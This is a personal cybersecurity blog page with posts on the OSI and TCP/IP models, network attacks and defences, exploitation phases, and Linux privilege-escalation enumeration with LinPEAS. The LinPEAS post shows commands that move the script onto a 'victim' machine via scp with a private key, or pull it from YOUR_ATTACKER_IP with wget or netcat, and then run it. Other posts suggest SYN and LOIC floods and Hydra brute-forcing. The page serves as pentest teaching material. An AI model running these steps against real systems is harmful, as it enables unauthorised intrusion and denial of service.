
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tobias Website</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <meta name="description" content="Explore Tobias A's portfolio - showcasing cybersecurity insights, tools, tips, and CTF rooms. Stay updated on threat intelligence and bug bounties.">

    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin: 0;
            font-family: 'Press Start 2P', sans-serif !important;
            background-color: #14161E;
            color: #e0e0e0;
            padding: 0 10px;
            box-sizing: border-box;
            overflow-x: hidden;
        }

        h1 {
            color: #2AF7A5;
        }
        
        /* Make sure the container uses flex to align items horizontally */
        .container {
            display: flex;             /* Ensure flex layout */
            justify-content: center;   /* Center items horizontally */
            align-items: center;       /* Vertically center items */
            gap: 15px;                 /* Add space between the button and link */
            margin-top: 50px;           /* Top margin to push the container down */
        }

        /* Back button container - just a style wrapper */
        .back-button-container {
            margin: 0;                 /* Reset any margins */
        }

        /* Style for both the button and the link (medium button) */
        .back-button, .medium-button {
            background-color: transparent;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 5px;
            font-size: 1.2em;
            cursor: pointer;
            transition: color 0.3s, box-shadow 0.3s;
            text-decoration: none;  /* Removes underline from the link */
            display: flex;           /* Flexbox for centering icon and text */
            align-items: center;     /* Vertically center the icon and text */
            justify-content: center; /* Horizontally center icon and text */
        }

        /* Hover effect for both the button and the medium link */
        .back-button:hover, .medium-button:hover {
            color: #2AF7A5;
            animation: pulse 1s infinite;
            box-shadow: 0 0 10px #2AF7A5, 0 0 20px #2AF7A5, 0 0 30px #2AF7A5;
            border: 2px solid #2AF7A5;
        }

        /* Pulse animation for hover effect */
        @keyframes pulse {
            0% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.1); opacity: 0.8; }
            100% { transform: scale(1); opacity: 1; }
        }

        /* Make sure the link inside the nav has no underline */
        nav a {
            color: inherit;  /* Use inherited text color */
            text-decoration: none;  /* Remove underline */
        }


        .post {
            cursor: pointer;
            padding: 15px;
            border: 2px solid #2AF7A5;
            margin-bottom: 15px;
            background: #1e1f29;
            transition: all 0.3s ease-in-out;
            border-radius: 10px;
            width: 90%;
            max-width: 600px;
            position: relative;
        }

        h4 {
            color: #2AF7A5;
        }

        .post:hover {
            background: #252836;
        }

        .post.expanded {
            background: #2b2d42;
            padding: 40px;
            width: calc(100% - 40px); /* Keep the width responsive */
            max-width: 100vw; /* Ensure the width doesn't exceed the viewport width */
            height: auto;
            min-height: 600px; /* Set a minimum height for bigger appearance */
            transform: none;
            box-shadow: 0 10px 25px rgba(42, 247, 165, 0.3);
            z-index: 10;
            position: relative;
            overflow: hidden;
            margin: 20px 0; /* Add margin for gap between posts */
            box-sizing: border-box;
            transition: height 0.3s ease; /* Smooth transition for height change */
        }

        .post-content {
            display: none;
            margin-top: 15px;
            font-size: 1.1em;
            color: #fff;
            overflow-y: auto;
            max-height: 500px;
        }

        .post.expanded .post-content {
            display: block;
        }

        .close-btn {
            position: absolute;
            top: 10px;
            right: 15px;
            font-size: 20px;
            cursor: pointer;
            color: #2AF7A5;
            display: none;
        }

        .post.expanded .close-btn {
            display: block;
        }

        table {
            width: 95%;
            border-collapse: collapse;
            background: #14161E;
        }
        th, td {
            padding: 10px;
            border: 1px solid #2AF7A5;
            text-align: left;
        }
        th {
            background-color: #333;
            color: white;
        }

        .link {
            color: #2AF7A5;
            text-decoration: none;
            font-weight: bold;
        }
        .link:hover {
            text-decoration: underline;
        }

        .terminal-container {
            width: 1100px;
            max-width: 90%;
            background-color: #14161E;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
            border: 1px solid #333;
        }
        .terminal-header {
            background-color: #222;
            padding: 6px 12px;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .terminal-header .dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
        }
        .red { background-color: #ff5f56; }
        .yellow { background-color: #ffbd2e; }
        .green { background-color: #27c93f; }
        .terminal-body {
            padding: 10px;
            color: #33ff33;
            font-size: 13px;
            line-height: 1.4;
            white-space: pre-wrap;
            font-family: "Fira Code", monospace;
            max-height: 300px;
            overflow-y: auto;
        }

    </style>
</head>

<body>

    <h1>Learning Hub</h1>

    <div class="container">
        <div class="back-button-container">
            <button class="back-button" onclick="window.location.href='index.html'">
                <i class="fas fa-home"></i> Intro
            </button>
        </div>
    
        <nav>
            <a href="https://medium.com/@vgqxjb" target="_blank" class="medium-button">
                <i class="fab fa-medium"></i> Medium
            </a>
        </nav>
    </div>    


    <h2>Latest Posts</h2>

    <div class="post" onclick="togglePost(this)">
        <h3>The OSI Model and Its Security Concerns</h3>
        <div class="post-content">
            <p>This is my undertanding of the OSI model</p>
            <p>The OSI Model (Open Systems Interconnection Model) is a conceptual framework that standardizes how network devices communicate. It has seven layers, each serving a specific role in data transmission.</p>
            
            
            <!-- Adding an Image -->
            <img src="osi.png" alt="OSI Model Layers" style="width: 100%; max-width: 1650px; border-radius: 10px;">

            <h4>1. Physical Layer (Layer 1)</h4>
            <p><strong>Function:</strong> Deals with the physical connection between devices. It defines cables, radio waves, and hardware transmission.</p>
            <p><strong>Devices/Technologies:</strong> Ethernet cables, fiber optics, hubs, repeaters.</p>
            <p><strong>Security Concern:</strong> Physical tampering, wiretapping, jamming attacks.</p>
    
            <h4>2. Data Link Layer (Layer 2)</h4>
            <p><strong>Function:</strong> Handles error detection, framing, and MAC addressing. It ensures that data flows correctly between devices on the same network.</p>
            <p><strong>Devices/Technologies:</strong> Switches, MAC addresses, ARP (Address Resolution Protocol).</p>
            <p><strong>Security Concern:</strong> MAC spoofing, VLAN hopping attacks.</p>
    
            <h4>3. Network Layer (Layer 3)</h4>
            <p><strong>Function:</strong> Determines the best path for data to travel. Uses logical addressing (IP addresses).</p>
            <p><strong>Devices/Technologies:</strong> Routers, IP addressing (IPv4, IPv6), ICMP (ping).</p>
            <p><strong>Security Concern:</strong> IP spoofing, DDoS attacks, route hijacking.</p>
    
            <h4>4. Transport Layer (Layer 4)</h4>
            <p><strong>Function:</strong> Ensures complete data transfer using segmentation and reassembly. Manages TCP (connection-oriented) and UDP (connectionless) communication.</p>
            <p><strong>Devices/Technologies:</strong> Firewalls, TCP, UDP, ports.</p>
            <p><strong>Security Concern:</strong> Port scanning, SYN flood attacks.</p>
    
            <h4>5. Session Layer (Layer 5)</h4>
            <p><strong>Function:</strong> Establishes, maintains, and terminates communication sessions between devices.</p>
            <p><strong>Devices/Technologies:</strong> APIs, sockets, NetBIOS.</p>
            <p><strong>Security Concern:</strong> Session hijacking, MITM (Man-in-the-Middle) attacks.</p>
    
            <h4>6. Presentation Layer (Layer 6)</h4>
            <p><strong>Function:</strong> Formats, encrypts, and compresses data for the application layer.</p>
            <p><strong>Devices/Technologies:</strong> SSL/TLS, encryption standards (AES, RSA).</p>
            <p><strong>Security Concern:</strong> SSL/TLS vulnerabilities (e.g., downgrade attacks), insecure encryption.</p>
    
            <h4>7. Application Layer (Layer 7)</h4>
            <p><strong>Function:</strong> Interfaces with the end user. It includes protocols for web browsing, email, and file transfer.</p>
            <p><strong>Devices/Technologies:</strong> HTTP/S, FTP, DNS, SMTP.</p>
            <p><strong>Security Concern:</strong> SQL injection, cross-site scripting (XSS), phishing.</p>
    
            <h4>Real-World Example (Penetration Testing Perspective)</h4>
            <p><strong>Layer 1:</strong> Ensure there’s no unauthorized access to physical network devices.</p>
            <p><strong>Layer 2:</strong> Look for MAC spoofing or ARP poisoning opportunities.</p>
            <p><strong>Layer 3:</strong> Check for open ports and IP vulnerabilities.</p>
            <p><strong>Layer 4:</strong> Perform a SYN flood attack to test resilience.</p>
            <p><strong>Layer 5-7:</strong> Exploit web vulnerabilities like SQL injection, XSS, or weak SSL configurations.</p>

            <img src="osilayerattacks.png" alt="OSI Model Layers" style="width: 100%; max-width: 1650px; border-radius: 10px;">

            <h4>OSI Model in Network Defense</h4>
            <p><strong>Layer 1:</strong> Use of fiber-optic cables to prevent eavesdropping.</p>
            <p><strong>Layer 2:</strong> How VLAN segmentation can prevent internal threats.</p>
            <p><strong>Layer 3:</strong> IP filtering, firewalls, and VPNs for protecting routing.</p>
            <p><strong>Layer 4:</strong> Use of rate limiting, firewalls, and load balancing to protect from DoS attacks.</p>
            <p><strong>Layer 5:</strong> SSL/TLS encryption to protect session integrity.</p>
            <p><strong>Layer 6:</strong> Data encryption for protecting sensitive information.</p>
            <p><strong>Layer 7:</strong> Implement Web Application Firewalls and strong input validation.</p>

            <h4>Comparison of the OSI Model and TCP/IP Model</h4>
            <img src="osiandtcpmodel.png" alt="OSI Model Layers" style="width: 100%; max-width: 1650px; border-radius: 10px;">
            
            <h4>Network Protocols</h4>
        <p>Protocols are predefined rules that govern how data is formatted, transmitted, and processed to enable seamless communication between devices in a network. These protocols function across various layers within network models, each designed to manage specific data types and communication requirements.</p>

        <h4>Key Network Protocols</h4>
        <p>Network protocols define the rules for data exchange across networks, ensuring efficient and structured communication. Each protocol operates at a specific layer of the OSI model, managing different aspects of data transmission.</p>

        <table>
            <tr>
                <th>Protocol</th>
                <th>Description</th>
            </tr>
            <tr>
                <td><strong>HTTP (Hypertext Transfer Protocol)</strong></td>
                <td>Enables the transfer of web pages and online content. It functions at the Application Layer, allowing communication between browsers and web servers.</td>
            </tr>
            <tr>
                <td><strong>FTP (File Transfer Protocol)</strong></td>
                <td>Facilitates file transfers between systems, also operating at the Application Layer. It provides a method for uploading and downloading files from remote servers.</td>
            </tr>
            <tr>
                <td><strong>SMTP (Simple Mail Transfer Protocol)</strong></td>
                <td>Manages email transmission. As an Application Layer protocol, it ensures emails are sent from one server to another, reaching their intended recipients.</td>
            </tr>
            <tr>
                <td><strong>TCP (Transmission Control Protocol)</strong></td>
                <td>Provides reliable, connection-oriented communication with error checking and data recovery. Operating at the Transport Layer, it guarantees ordered and complete data delivery.</td>
            </tr>
            <tr>
                <td><strong>UDP (User Datagram Protocol)</strong></td>
                <td>Offers fast, connectionless communication without error recovery. Operating at the Transport Layer, it is ideal for applications prioritizing speed over reliability, such as streaming and gaming.</td>
            </tr>
            <tr>
                <td><strong>IP (Internet Protocol)</strong></td>
                <td>Handles packet addressing and routing across networks, ensuring data reaches the correct destination. It operates at the Internet Layer, guiding data through interconnected networks.</td>
            </tr>
        </table>

        </div>
    </div>

    <div class="post" onclick="togglePost(this)">
        <h3>Understanding the TCP/IP Model</h3>
        <div class="post-content">
            <img src="tcpIP.png" alt="OSI Model Layers" style="width: 30%; max-width: 1650px; border-radius: 10px;">
            <p>So, we’ve all heard about the <strong>TCP/IP Model</strong>, but what exactly is it, and why should we care about it? Well, it’s basically the backbone of how the internet works. Without it, you wouldn’t be able to binge-watch Netflix, scroll through Instagram, or even check your email!</p>
    
            <h4>What is the TCP/IP Model?</h4>
            <p>The TCP/IP Model (Transmission Control Protocol/Internet Protocol) is a set of communication protocols that define how data is transmitted over a network. It's a more practical, real-world model than the OSI model and is the foundation for the internet and most networks.</p>
    
            <h4>Why do we need it?</h4>
            <p>Well, every time you send a message, share a file, or visit a website, data is passed between devices using the TCP/IP model. It’s like the secret sauce that makes everything connect, and without it, the internet wouldn’t even exist in the way we know it today.</p>
    
            <h4>The Four Layers of the TCP/IP Model</h4>
            <p>The TCP/IP model has <strong>4 layers</strong>, and each one is crucial in making sure data gets from point A to point B smoothly:</p>
    
            <h4>1. Link Layer</h4>
            <p><strong>What it does:</strong> This layer is all about the physical connection. It’s responsible for the hardware that sends and receives data – think Ethernet cables, Wi-Fi, and the devices that connect to the network. It’s like the roads and highways that connect cities. The Link Layer corresponds to the Physical and Data Link Layers of the OSI model, covering everything from the physical connection to data framing.</p>
            
            <h4>2. Internet Layer</h4>
            <p><strong>What it does:</strong> This is where things get interesting. The Internet layer is responsible for routing and addressing. The most famous protocol here is IP (Internet Protocol), which uses IP addresses to figure out where data needs to go. It’s like the GPS system of the internet. This layer corresponds to the Network Layer in the OSI model.</p>
    
            <h4>3. Transport Layer</h4>
            <p><strong>What it does:</strong> The transport layer ensures that the data gets to its destination safely and intact. This is where TCP (Transmission Control Protocol) comes in. It makes sure the data is delivered reliably, no matter how many stops it makes along the way. If something goes wrong, it’ll ask for a resend. Think of it like a mailman who double-checks that your package gets delivered correctly. This layer ensures that data packets are delivered in a sequential and error-free manner, corresponding to the Transport Layer of the OSI model.</p>
    
            <h4>4. Application Layer</h4>
            <p><strong>What it does:</strong> This is the layer that we, as users, interact with. The application layer includes all the protocols that help us use services like HTTP for web browsing, SMTP for sending emails, and FTP for transferring files. It’s what makes the internet usable for us. Without this layer, we wouldn’t have the web, email, or apps! This layer corresponds to the top three layers of the OSI model (Session, Presentation, and Application), providing interfaces and protocols necessary for data exchange between systems.</p>
    
            <h4>Real-Life Example</h4>
            <p>Imagine you’re sending an email. Here’s how the TCP/IP layers help out:</p>
            <ul>
                <li>Network Interface: Your computer physically connects to the network.</li>
                <li>Internet: The email gets a destination address (IP address) and is routed through the internet.</li>
                <li>Transport: TCP ensures that the email arrives without errors and is complete.</li>
                <li>Application: The email reaches the email server, and you see it in your inbox.</li>
            </ul>

            <p>When conducting penetration testing, it's essential to understand the TCP/IP model, as each layer has its own set of vulnerabilities. Here’s an example of a penetration test that targets each layer of the TCP/IP model, followed by the best defense strategies for each layer.</p>

        <h4>Layer 1: Network Interface Layer - ARP Spoofing</h4>
        <p><strong>Penetration Testing:</strong> At the Network Interface Layer, an attacker can perform ARP (Address Resolution Protocol) spoofing, also known as <strong>Man-in-the-Middle (MITM)</strong> attacks. This attack allows the attacker to intercept data being sent over the local network by poisoning the ARP cache, causing traffic to be sent to the attacker instead of the intended recipient.</p>

        <h4>Defense Strategy:</h4>
        <ul>
            <li><strong>Static ARP Entries:</strong> Use static ARP entries for critical devices (routers, servers) to prevent ARP poisoning.</li>
            <li><strong>Network Segmentation:</strong> Use VLANs to segment sensitive network traffic and minimize exposure to local attackers.</li>
            <li><strong>Intrusion Detection Systems (IDS):</strong> Implement IDS to detect unusual network traffic and ARP spoofing attempts.</li>
        </ul>

        <h4>Layer 2: Internet Layer - IP Spoofing</h4>
        <p><strong>Penetration Testing:</strong> In the Internet Layer, attackers can spoof IP addresses to disguise the origin of their traffic. This can be used for attacks like <strong>Denial of Service (DoS)</strong> or <strong>Distributed Denial of Service (DDoS)</strong> by flooding the target server with fake requests, making it difficult to trace the real attacker.</p>

        <h4>Defense Strategy:</h4>
        <ul>
            <li><strong>Ingress/Egress Filtering:</strong> Implement filtering on routers/firewalls to ensure only legitimate IP addresses are allowed to communicate.</li>
            <li><strong>Rate Limiting:</strong> Set rate limits on incoming traffic to prevent overwhelming servers with traffic from spoofed IP addresses.</li>
            <li><strong>Anti-Spoofing Configurations:</strong> Configure anti-spoofing rules on the router to check that the source IP matches the expected IP range.</li>
        </ul>

        <h4>Layer 3: Transport Layer - TCP SYN Flood</h4>
        <p><strong>Penetration Testing:</strong> The Transport Layer is where attackers often launch <strong>SYN Flood</strong> attacks. In this attack, the attacker sends a flood of TCP/SYN requests, causing the target machine to allocate resources and wait for the final acknowledgment, which never comes. This leads to a resource exhaustion and denial of service.</p>

        <h4>Defense Strategy:</h4>
        <ul>
            <li><strong>Flood Protection (SYN Cookies):</strong> Implement SYN cookies or SYN cache to handle incomplete TCP connections and prevent resource exhaustion.</li>
            <li><strong>Firewall Filtering:</strong> Use firewalls to detect and block high volumes of SYN packets from single or multiple sources.</li>
            <li><strong>Rate Limiting:</strong> Rate limit incoming connections to prevent an excessive number of requests from consuming resources.</li>
        </ul>

        <h4>Layer 4: Application Layer - HTTP Flood Attack</h4>
        <p><strong>Penetration Testing:</strong> At the Application Layer, attackers can flood a web server with HTTP requests to perform a <strong>DoS</strong> attack. This consumes server resources, potentially causing the site to crash or become slow. This is common in <strong>Layer 7 DDoS attacks</strong> targeting web applications.</p>

        <h4>Defense Strategy:</h4>
        <ul>
            <li><strong>Web Application Firewall (WAF):</strong> Use a WAF to filter and block malicious HTTP requests that are part of a DDoS attack.</li>
            <li><strong>Content Delivery Network (CDN):</strong> Use a CDN to distribute traffic and mitigate the impact of DDoS attacks.</li>
            <li><strong>Rate Limiting & CAPTCHAs:</strong> Implement rate limiting and CAPTCHAs on the application layer to prevent automated attacks.</li>
        </ul>

        <h4>Real-World Penetration Test Example</h4>
        <p>Let’s say you’re testing a web application for vulnerabilities. Here’s how the penetration test might go:</p>
        <ul>
            <li><strong>Network Interface:</strong> You could start by sniffing the network with tools like Wireshark and attempt ARP spoofing to capture sensitive data between clients and the server.</li>
            <li><strong>Internet Layer:</strong> Next, you may try IP spoofing to confuse the server or perform DDoS testing by flooding it with malicious packets.</li>
            <li><strong>Transport Layer:</strong> Using a tool like LOIC (Low Orbit Ion Cannon), you might simulate a SYN flood attack to exhaust the server's resources.</li>
            <li><strong>Application Layer:</strong> Finally, you could use a tool like Hydra to brute-force login forms, or perform an HTTP flood using LOIC to check the server's resilience against DDoS attacks.</li>
        </ul>

        <img src="tcpipattackdefense.png" alt="OSI Model Layers" style="width: 100%; max-width: 1650px; border-radius: 10px;">

        <h4>Defensive Measures Summary:</h4>
        <p>Penetration testing helps us identify vulnerabilities, but it’s crucial to implement the right defenses at each layer of the TCP/IP model:</p>
        <ul>
            <li><strong>Network Interface Layer:</strong> Static ARP entries, network segmentation, IDS.</li>
            <li><strong>Internet Layer:</strong> IP filtering, anti-spoofing, rate limiting.</li>
            <li><strong>Transport Layer:</strong> SYN cookies, firewall filtering, rate limiting.</li>
            <li><strong>Application Layer:</strong> WAF, CDN, rate limiting, CAPTCHAs.</li>
        </ul>
        
        <h4>Comparison of the OSI Model and TCP/IP Model</h4>
        <img src="osiandtcpmodel.png" alt="OSI Model Layers" style="width: 100%; max-width: 1650px; border-radius: 10px;">

        <h4>Functions of the Models</h4>
        <p>In real world networking, the TCP/IP model serves as the foundation for data transmission, widely utilized in diverse network infrastructures. Conversely, the OSI model, though not directly implemented, acts as a vital conceptual guide. It simplifies the intricacies of network communication, offering a structured perspective on how different components interact. Together, these models create a holistic understanding, connecting theoretical principles with practical execution in networking.</p>

        




        </div>
    </div>

    <div class="post" onclick="togglePost(this)">
        <h3>Transmission in Networking</h3>
        <div class="post-content">
            <h4>Transmission in Networking</h4>
    
            <p>In networking, <strong>transmission</strong> is basically how data gets sent from one device to another over some kind of medium. To get a better grasp of this, let's break it down into three key areas: <strong>types of transmission, transmission modes, and transmission media</strong>.</p>
            
            <h4>Types of Transmission</h4>
            <p>There are two main ways data can be transmitted: <strong>analog and digital</strong>.</p>
            <ul>
                <li><strong>Analog transmission</strong> uses continuous signals to send information, like how traditional radios broadcast music. The signals vary smoothly, kind of like sound waves.</li>
                <li><strong>Digital transmission</strong>, on the other hand, breaks data into discrete units—<strong>bits (0s and 1s)</strong>—which makes it way more efficient and reliable for modern communication, like the internet and phone networks.</li>
            </ul>

            <h4>Transmission Modes</h4>
            <p>This refers to how data moves between devices. There are three main modes:</p>
            <ol>
                <li><strong>Simplex:</strong> One-way communication, like a keyboard sending input to a computer—data only flows in one direction.</li>
                <li><strong>Half-duplex:</strong> Two-way communication, but not at the same time. Think of a walkie-talkie—only one person can talk at a time.</li>
                <li><strong>Full-duplex:</strong> Two-way communication <strong>at the same time</strong>, like a phone call where both people can talk and listen simultaneously.</li>
            </ol>

            <h4>Transmission Media</h4>
            <p>This is just the <strong>physical or wireless path</strong> data takes to travel between devices. It’s divided into two main categories:</p>
            
            <h4>Wired Media</h4>
            <ul>
                <li><strong>Twisted pair cables:</strong> Used in Ethernet and LANs.</li>
                <li><strong>Coaxial cables:</strong> Used for cable TV.</li>
                <li><strong>Fiber optics:</strong> Uses light pulses for super-fast internet connections.</li>
            </ul>

            <h4>Wireless Media</h4>
            <ul>
                <li><strong>Radio waves:</strong> Used for Wi-Fi and cellular networks.</li>
                <li><strong>Microwaves:</strong> Used for satellites.</li>
                <li><strong>Infrared signals:</strong> Used in remote controls.</li>
            </ul>
            
        </div>
    </div>

    <div class="post" onclick="togglePost(this)">
        <h3>Understanding the Differences Between Exploitation & Post-Exploitation</h3>
        <div class="post-content">
            
            <img src="exploitation.jpg" alt="OSI Model Layers" style="width: 99%; height: 400px; border-radius: 10px;">

            <p>Once an attacker gains a foothold in a target system, post-exploitation comes into play. This phase focuses on maintaining access, escalating privileges, Evasive Testing, Pillaging, Vulnerability Assessment, and gathering valuable data while staying undetected.</p>
    
            <p>To make it clearer, <strong>exploitation</strong> is when we attack the target from <strong>outside</strong>, aiming to gain initial access. This could be done by exploiting a vulnerability to get a <strong>reverse shell</strong> into their system.</p>

            <p>Once we are inside, we then decide what to do next whether to escalate privileges, maintain persistence, or move laterally. <strong>This phase is called post-exploitation.</strong> It's all about leveraging our access to gain more control, extract valuable data, and ensure we can come back later without detection.</p>

            <p>In short:</p>
            <ul>
                <li><strong>Exploitation</strong> = Gaining access (e.g., reverse shell, RCE, phishing).</li>
                <li><strong>Post-Exploitation</strong> = What we do after access (e.g., privilege escalation, persistence, lateral movement).</li>
            </ul>

            <p>If we gain access to a server that is already running with <strong>high privileges</strong> (such as root or administrator), the transition from <strong>exploitation</strong> to <strong>post-exploitation</strong> happens almost immediately. Since we already have elevated privileges, there’s no need for privilege escalation, and we can directly begin actions like <strong>maintaining access, extracting sensitive data, and moving laterally</strong> within the network. This rapid shift is an important distinction, as it allows attackers to quickly leverage their access without additional steps, making the system more vulnerable to further exploitation.</p>

        </div>
    </div>

    <div class="post" onclick="togglePost(this)">
        <h3>Linux System Enumeration</h3>
        <div class="post-content">
            
            <img src="enumeratingsyetm.jpg" alt="OSI Model Layers" style="width: 70%; height: 400px; border-radius: 10px;">

            <p>System enumeration is a critical step in privilege escalation, as it provides the necessary insights to understand how to gain higher access levels and reach your goal, whether that’s information exfiltration or system manipulation. Without proper enumeration, achieving your objectives is nearly impossible, as lower privilege accounts generally lack the necessary permissions for sensitive actions.</p>

            <p>To effectively escalate privileges, the goal is to gather information that helps you map out the system's structure, its security posture, and potential weaknesses. Here's what needs to be collected:</p>

            <ul>
            <li><strong>System Information:</strong> Gather OS version, kernel version, architecture, and installed patches to identify vulnerabilities or known exploits related to the system setup.</li>
            <li><strong>User Information:</strong> Identify the current user’s privileges, list all system users, and check for sudo rights. Understanding user roles and privileges is critical for identifying potential avenues for escalation.</li>
            <li><strong>Network Information:</strong> Map out network interfaces, routing tables, and active connections. This information is crucial for lateral movement and identifying potential attack vectors.</li>
            <li><strong>Running Services:</strong> List active processes, open ports, and scheduled tasks. Services can often provide elevated access or valuable insights into system configuration.</li>
            <li><strong>File System:</strong> Identify interesting files, check for permission issues, and review mounted drives. Misconfigured file permissions can often lead to privilege escalation.</li>
            <li><strong>Installed Software:</strong> Review applications and their versions, looking for outdated or vulnerable software. Exploiting these can lead to higher privileges or even remote code execution.</li>
            <li><strong>Security Mechanisms:</strong> Examine firewall rules, SELinux status, and AppArmor profiles. Understanding these mechanisms is key to bypassing security restrictions or detecting vulnerabilities.</li>
            </ul>

            <p>I want to point out that system enumeration can be done manually, but there are also tools that automate this process. One such tool is <strong>Linux Privilege Escalation Awesome Script (LinPEAS)</strong>.</p>

            <p>LinPEAS is designed to automatically detect possible privilege escalation vectors on Linux systems. It scans the system for misconfigurations, outdated software, and other security weaknesses that could be exploited to gain higher privileges.</p>

            <p>You can download LinPEAS from the official repository: <a class="link" href="https://github.com/peass-ng/PEASS-ng" target="_blank">GPEASS-ng</a>.</p>

            <p>LinPEAS provides a rich, color-coded output to help users quickly identify potential security issues based on severity:</p>

            <ul>
                <li><span style="color: red;"><strong>Red:</strong></span> Highly probable privilege escalation vectors</li>
                <li><span style="color: yellow;"><strong>Yellow:</strong></span> Potential privilege escalation vectors that require further analysis</li>
                <li><span style="color: green;"><strong>Green:</strong></span> General information useful for manual enumeration</li>
            </ul>

            <p>This feature enhances usability by allowing security professionals to distinguish between different risk levels efficiently.</p>

            <p><strong>Key Features of LinPEAS</strong></p>

            <p>LinPEAS is designed to automate the process of identifying privilege escalation opportunities. Its key features include, but are not limited to:</p>

            <ul>
                <li>Automated detection of common privilege escalation vectors</li>
                <li>Identification of misconfigurations in services, cron jobs, and SUID/SGID binaries</li>
                <li>Detection of credentials in files, environment variables, or process memory</li>
                <li>Checking for vulnerable software versions and known kernel exploits</li>
                <li>Analysis of sudo privileges and other permission-related issues</li>
                <li>Enumeration of sensitive information that could aid lateral movement</li>
            </ul>

            <h4>Intallation</h4>

            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
                <div class="terminal-body">
kali@kali:~$ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
        
--2025-02-27 06:22:39--  https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://github.com/peass-ng/PEASS-ng/releases/download/20250223-a8d560c8/linpeas.sh [following]
--2025-02-27 06:22:39--  https://github.com/peass-ng/PEASS-ng/releases/download/20250223-a8d560c8/linpeas.sh
<SNIP>
linpeas.sh                      100%[=================================================================>] 820.39K  --.-KB/s    in 0.09s
        
2025-02-27 06:22:40 (8.96 MB/s) - ‘linpeas.sh’ saved [840082/840082]
                </div>
            </div><br>

            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>

                <div class="terminal-body">
kali@kali:~$ ls

linpeas.sh
                </div>
            </div><br>

            <p>Uploading via scp</p>

            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>

                <div class="terminal-body">
kali@kali:~$ scp -i -private-key- -file-to-transfer- -username-@-ip-address-:-path-to-store-
                </div>
            </div> 

            <p>If you have the private key (id_rsa) and SSH access to the victim machine, you can upload the file using the following approach.</p>

            <p>Uploading via scp</p>

            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>

                <div class="terminal-body">
kali@kali:~$ scp -i id_rsa ./linpeas.sh john@10.129.12.10:/home/john

linpeas.sh                                                                           100%  820KB   1.6MB/s   00:00
                </div>
            </div> 

          <h4>Different way to upload this file</h4>

          <p>1: Uploading via Python HTTP Server (If No Internet on Target)</p>

          <p>If the target cannot download files directly but you have access to an internal pivot machine or your attacker machine, you can start a simple web server and pull the file from there.</p>

          <div class="terminal-container">
            <div class="terminal-header">
                <div class="dot red"></div>
                <div class="dot yellow"></div>
                <div class="dot green"></div>
            </div>

            <div class="terminal-body">
kali@kali:~$ cd /path/to/linpeas

kali@kali:~$ python3 -m http.server 8080                                                                           100%  820KB   1.6MB/s   00:00
            </div>
          </div><br>

        <div class="terminal-container">
            <div class="terminal-header">
                <div class="dot red"></div>
                <div class="dot yellow"></div>
                <div class="dot green"></div>
            </div>

            <div class="terminal-body">
kali@kali:~$ wget http://YOUR_ATTACKER_IP:8080/linpeas.sh

kali@kali:~$ chmod +x linpeas.sh

kali@kali:~$ ./linpeas.sh
            </div>
        </div>


        <p>2: Uploading via Netcat (If You Have a Reverse Shell)</p>
        <p>If you have a shell on the victim machine, but no direct internet, you can transfer LinPEAS using nc.</p>

        <div class="terminal-container">
            <div class="terminal-header">
                <div class="dot red"></div>
                <div class="dot yellow"></div>
                <div class="dot green"></div>
            </div>

            <div class="terminal-body">
kali@kali:~$ nc -lvnp 4444 < linpeas.sh
            </div>
        </div>

        <p>On the victim machine:</p>

        <div class="terminal-container">
            <div class="terminal-header">
                <div class="dot red"></div>
                <div class="dot yellow"></div>
                <div class="dot green"></div>
            </div>

            <div class="terminal-body">
kali@kali:~$ nc YOUR_ATTACKER_IP 4444 > linpeas.sh

kali@kali:~$ chmod +x linpeas.sh

kali@kali:~$ ./linpeas.sh
            </div>
        </div>

        <p>After we have successfully transferred the script, we can log in to the target and check if it’s there.</p>

        <p>Linpeas offer many options: by using the bash linpeas.sh --help command. it woudl show you something like this:</p>

        <div class="terminal-container">
            <div class="terminal-header">
                <div class="dot red"></div>
                <div class="dot yellow"></div>
                <div class="dot green"></div>
            </div>

            <div class="terminal-body">
kali@kali:~$ linpeas.sh -h

Enumerate and search Privilege Escalation vectors.
This tool enum and search possible misconfigurations (known vulns, user, processes and file permissions, special file permissions, readable/writable files, bruteforce other users(top1000pwds), passwords...) inside the host and highlight possible misconfigurations with colors.
        Checks:
            -a Perform all checks: 1 min of processes, su brute, and extra checks.
            -o Only execute selected checks (system_information,container,cloud,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_perms_files,interesting_files,api_keys_regex). Select a comma separated list.
            -s Stealth & faster (don't check some time consuming checks)
            -e Perform extra enumeration
            -r Enable Regexes (this can take from some mins to hours)
            -P Indicate a password that will be used to run 'sudo -l' and to bruteforce other users accounts via 'su'
            -D Debug mode

        Network recon:
            -t Automatic network scan - This option writes to files
            -d [IP/NETMASK] Discover hosts using fping or ping. Ex: -d 192.168.0.1/24
            -p [PORT(s)] -d [IP/NETMASK] Discover hosts looking for TCP open ports (via nc). By default ports 22,80,443,445,3389 and another one indicated by you will be scanned (select 22 if you don't want to add more). You can also add a list of ports. Ex: -d 192.168.0.1/24 -p 53,139
